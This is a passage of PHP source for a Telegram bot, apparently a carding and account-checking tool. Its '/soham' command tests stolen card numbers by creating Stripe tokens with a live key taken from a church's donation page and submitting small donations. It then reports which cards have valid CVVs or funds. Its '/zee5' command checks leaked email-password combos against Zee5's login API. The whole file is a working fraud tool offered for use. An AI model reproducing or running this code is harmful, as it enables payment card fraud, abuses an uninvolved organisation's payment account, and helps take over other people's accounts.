sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u><b>Error Not listed</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Private Gateway %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);
}



elseif (strpos($message, "/soham") === 0){
$lista = substr($message, 7);
$i = explode("|", $lista);
$cc = $i[0];
$mes = $i[1];
$ano = $i[2];
$cvv = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-ch-ua-mobile: ?0',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  'type=card&billing_details[name]=Mark+Alison&billing_details[email]=rhgrheR%40openitbox.com&billing_details[phone]=4584564651&billing_details[address][line1]=Street+104%2C+Street+104&billing_details[address][city]=Kalamazoo&billing_details[address][state]=MI&billing_details[address][postal_code]=A1A+1A1&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=c683262a-ede4-4242-97bd-c31031f76a2378b2ea&muid=03a56afd-6a28-45e8-953b-d473d4a4a4e473099a&sid=be237385-65a8-4c23-8d2e-407bb6e1ee8e522063&pasted_fields=number&payment_user_agent=stripe.js%2Fc7a0b9a66%3B+stripe-js-v3%2Fc7a0b9a66&time_on_page=94203&referrer=https%3A%2F%2Ftoulouseinternationalchurch.org%2F&key=pk_live_Y7OlfrlgA97czcK8Ay1cMfBD00H6ts7jks');

$result = curl_exec($ch);
$id = trim(strip_tags(getStr($result,'"id": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]=10010&guid=c683262a-ede4-4242-97bd-c31031f76a2378b2ea&muid=03a56afd-6a28-45e8-953b-d473d4a4a4e473099a&sid=be237385-65a8-4c23-8d2e-407bb6e1ee8e522063&payment_user_agent=stripe.js%2Fc7a0b9a66%3B+stripe-js-v3%2Fc7a0b9a66&time_on_page=95327&referrer=https%3A%2F%2Ftoulouseinternationalchurch.org%2F&key=pk_live_Y7OlfrlgA97czcK8Ay1cMfBD00H6ts7jks&pasted_fields=number');

$result15 = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"id": "','"')));


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://toulouseinternationalchurch.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: toulouseinternationalchurch.org',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: _ga=GA1.2.1356934292.1608704874; __stripe_mid=03a56afd-6a28-45e8-953b-d473d4a4a4e473099a; _gid=GA1.2.1506037588.1614079457; __stripe_sid=be237385-65a8-4c23-8d2e-407bb6e1ee8e522063',
'origin: https://toulouseinternationalchurch.org',
'referer: https://toulouseinternationalchurch.org/give/',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  'action=ds_process_button&stripeToken='.$token.'&paymentMethodID='.$id.'&allData%5BbillingDetails%5D%5Bname%5D=Mark+Alison&allData%5BbillingDetails%5D%5Bemail%5D=rhgrheR%40openitbox.com&allData%5BbillingDetails%5D%5Bphone%5D=4584564651&allData%5BbillingDetails%5D%5Baddress%5D%5Bline1%5D=Street+104%2C+Street+104&allData%5BbillingDetails%5D%5Baddress%5D%5Bcity%5D=Kalamazoo&allData%5BbillingDetails%5D%5Baddress%5D%5Bstate%5D=MI&allData%5BbillingDetails%5D%5Baddress%5D%5Bpostal_code%5D=49006&allData%5BbillingDetails%5D%5Baddress%5D%5Bcountry%5D=US&type=donation&amount=0.5&params%5Bvalue%5D=ds1585398497421&params%5Bname%5D=Toulouse+International+Church&params%5Bamount%5D=MTAwMA%3D%3D&params%5Boriginal_amount%5D=0.5&params%5Bdescription%5D=Support+TIC+through+online+giving.&params%5Bpanellabel%5D=Confirm+donation&params%5Btype%5D=donation&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=&params%5Bcurrency%5D=USD&params%5Blocale%5D=auto&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=ds1585398497421&params%5Bcustom_role%5D=&params%5Bbilling%5D=1&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_Y7OlfrlgA97czcK8Ay1cMfBD00H6ts7jks&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Ftoulouseinternationalchurch.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Ftoulouseinternationalchurch.org%2Fwp-content%2Fuploads%2F2019%2F12%2Ftic-square-light-white.png&params%5Binstance%5D=ds1585398497421&params%5Bds_nonce%5D=e1566eb5a1&ds_nonce=e1566eb5a1');

$result3 = curl_exec($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strpos($result3, "Thank you for your support!")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED ✅✅</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 3) %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result3, 'security code is incorrect.')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED ✅</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 3) %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result3, 'Your card has insufficient funds.')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED ✅✅ [Insuff. Funds]</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 3) %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result3, 'Your card has expired')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>EXPIRED CARD ❌</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 3) %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result3, "Your card was declined")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>DO NOT HONOR ❌</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 3) %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result3, "Oops, the payment didn't go through.")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>INCORRECT CARD NUMBER ❌</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 3) %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result3, 'card number is incorrect.')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>THIS CARD CANNOT BE PROCCED FOR THIS PAYMENT ❌</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 3) %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result3, 'Your card does not support this type of purchase')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>YOUR CARD NOT SUPPORT THIS PURCHASE ❌</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 3) %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result3, '504 Gateway Time-out')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>TIME OUT [Card Was Not Processed] ❌</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 3) %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
else{
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u><b>Error Not listed</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 3) %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);
}


//////////=========[Zee5 Command]=========//////////

elseif (strpos($message, "/zee5") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
};
$email = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////===========[Login Check]============/////////////////////

$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));

/////////////////===============[Result]===========///////////////////

if($token){
sendMessage($chatId, "<b>ZEE5 Account:</b>%0A<u>Combo:</u> <code>$combo</code>%0A<u>Response:</u> <b>Successfully Logged in</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}else{
sendMessage($chatId, "<u>Combo:</u> <code>$combo</code>%0A<u>Response:</u> <b>Wrong Email or Password</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
};
curl_close($ch);
ob_flush();
}

////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};

////////////////=============[]=============////////////////
////////==========[Join @TechSoham and @ZeltraxChat for more]==========////////

?>
